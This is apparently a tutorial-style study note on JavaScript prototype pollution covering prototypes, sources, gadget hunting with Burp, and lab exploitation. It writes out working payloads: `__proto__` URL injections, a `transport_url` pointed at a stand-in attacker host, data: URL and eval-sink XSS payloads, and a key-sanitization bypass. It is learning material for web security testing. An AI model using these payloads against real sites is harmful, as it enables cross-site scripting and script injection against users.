# Prototype pollution
Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.  
JS object:
```
const user =  {
    username: "wiener",
    userId: 01234,
    isAdmin: false
}
```
You can access the properties of an object by using either dot notation or bracket notation to refer to their respective keys: 
```
user.username     // "wiener"
user['userId']    // 01234
```
As well as data, properties may also contain executable functions. In this case, the function is known as a "method". 
```
const user =  {
    username: "wiener",
    userId: 01234,
    exampleMethod: function(){
        // do something
    }
}
```
Prototypes:
```
let myObject = {};
Object.getPrototypeOf(myObject);    // Object.prototype

let myString = "";
Object.getPrototypeOf(myString);    // String.prototype

let myArray = [];
Object.getPrototypeOf(myArray);	    // Array.prototype

let myNumber = 1;
Object.getPrototypeOf(myNumber);    // Number.prototype
```
Objects automatically inherit all of the properties of their assigned prototype, unless they already have their own property with the same key. This enables developers to create new objects that can reuse the properties and methods of existing objects.  
The built-in prototypes provide useful properties and methods for working with basic data types. For example, the String.prototype object has a toLowerCase() method  
Whenever you reference a property of an object, the JavaScript engine first tries to access this directly on the object itself. If the object doesn't have a matching property, the JavaScript engine looks for it on the object's prototype instead  
We can check such behaviour in browser console:
```
let myObject = {};
myObject.
```
And after dot we will see all pre-defined properties from prototype  
Even though there are no properties or methods defined for the object itself, it has inherited some from the built-in Object.prototype.  
everything in JavaScript is an object under the hood, this chain ultimately leads back to the top-level Object.prototype, whose prototype is simply null.   
Objects inherit properties not just from their immediate prototype, but from all objects above them in the prototype chain  
Modifying prototypes:
```
let searchTerm = "  example ";
searchTerm.removeWhitespace();    // "example"
```
## How do prototype pollution vulnerabilities arise?
Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys. This can allow an attacker to inject a property with a key like __proto__, along with arbitrary nested properties.  
Due to the special meaning of `__proto__` in a JavaScript context, the merge operation may assign the nested properties to the object's prototype instead of the target object itself. As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way.  
It's possible to pollute any prototype object, but this most commonly occurs with the built-in global `Object.prototype`.  
## Prototype pollution sources
* The URL via either the query or fragment string (hash) 
* JSON-based input
* Web messages
## Prototype pollution via the URL
```
https://vulnerable-website.com/?__proto__[evilProperty]=payload
```
```
targetObject.__proto__.evilProperty = 'payload';
```
During this assignment, the JavaScript engine treats `__proto__` as a getter for the prototype. As a result, evilProperty is assigned to the returned prototype object rather than the target object itself. Assuming that the target object uses the default Object.prototype, all objects in the JavaScript runtime will now inherit evilProperty, unless they already have a property of their own with a matching key.  
In practice, injecting a property called evilProperty is unlikely to have any effect. However, an attacker can use the same technique to pollute the prototype with properties that are used by the application, or any imported libraries.  
## Prototype pollution via JSON input
```
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```
For example if site uses URL to import JS library, attacker can craft malicious URL to import own JS  
```
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
```
By providing a data: URL, an attacker could also directly embed an XSS payload within the query string as follows: 
```
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
```
Note that the trailing // in this example is simply to comment out the hardcoded /example.js suffix.  
## Client-side prototype pollution vulnerabilities
When testing for client-side vulnerabilities, this involves the following high-level steps:
* Try to inject an arbitrary property via the query string, URL fragment, and any JSON input. For example:
`vulnerable-website.com/?__proto__[foo]=bar`
* In your browser console, inspect Object.prototype to see if you have successfully polluted it with your arbitrary property: 
```
Object.prototype.foo
// "bar" indicates that you have successfully polluted the prototype
// undefined indicates that the attack was not successful
``` 
* If the property was not added to the prototype, try using different techniques, such as switching to dot notation rather than bracket notation, or vice versa:
```
vulnerable-website.com/?__proto__.foo=bar
```
Once you've identified a source that lets you add arbitrary properties to the global Object.prototype, the next step is to find a suitable gadget that you can use to craft an exploit  
1. Look through the source code and identify any properties that are used by the application or any libraries that it imports. 
2. Intercept the response containing the JavaScript that you want to test. 
3. Add a debugger statement at the start of the script, then forward any remaining requests and responses.
4. In Burp's browser, go to the page on which the target script is loaded. The debugger statement pauses execution of the script. 
5. While the script is still paused, switch to the console and enter the following command, replacing YOUR-PROPERTY with one of the properties that you think is a potential gadget:
```
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
    get() {
        console.trace();
        return 'polluted';
    }
})
```
6. Press the button to continue execution of the script and monitor the console. If a stack trace appears, this confirms that the property was accessed somewhere within the application. 
7. Expand the stack trace and use the provided link to jump to the line of code where the property is being read. 
8. Using the browser's debugger controls, step through each phase of execution to see if the property is passed to a sink, such as innerHTML or eval()
We can make this process easier with `DOM Invader` from Burp's browser  
  
Example of attack:
```
url/?__proto__[foo]=bar
```
Go to console and type `Object.prototype`. If we see foo: bar in properties, prototype was polluted  
Next we are detecting some object in js file such as `config.transport_url`  
Next, we are trying to set it's property to anything else:
```
/?__proto__[transport_url]=bar
```
Next we will check properties of `Object.prototype` in console and detect that `transport_url` property now equals `bar`  
And after that we are looking for some gadget where our property is reflected (for example sript src)  
And finally we craft payload to exploit  xss:
```
/?__proto__[transport_url]=data:,alert(document.domain);//
```
  
Another example:
if standard test didn't work, try to sue dot in place of brackets:
```
/?__proto__.foo=bar
```
Next we can detect sink such as `eval()` function and if there any object's property such as `manager.sequence`, we can try to pollute it:
```
/?__proto__.sequence=alert(document.domain)
```
If this doesn't work, set a breakpoint at console on the line of code which uses our polluted property and look what's wrong. In our case script added +1 to our script, so we can simply add ` -` to our payload.  
## Prototype pollution via the constructor
myObject.constructor.prototype is equivalent to myObject.__proto__, this provides an alternative vector for prototype pollution.  
## Bypassing flawed key sanitization
vulnerable-website.com/?__pro__proto__to__.gadget=payload  
